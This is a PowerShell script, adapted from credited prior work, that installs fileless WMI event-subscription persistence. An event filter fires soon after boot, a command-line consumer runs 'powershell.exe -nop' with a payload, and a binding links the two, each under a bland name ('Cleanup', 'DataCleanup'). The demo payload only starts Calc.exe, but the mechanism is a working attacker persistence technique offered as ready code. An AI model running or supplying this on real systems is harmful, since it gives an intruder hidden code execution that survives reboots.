<#
Credits to @mattifestion for his awesome work on WMI and Powershell Fileless Persistence.  This script is an adaptation of his work.
#>

    $Payload = "Start-Process Calc.exe"
    $EventFilterName = 'Cleanup'
    $EventConsumerName = 'DataCleanup'
    $finalPayload = "powershell.exe -nop -c `"$Payload`""

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 1 AND TargetInstance.SystemUpTime < 300"
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $finalPayload
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }
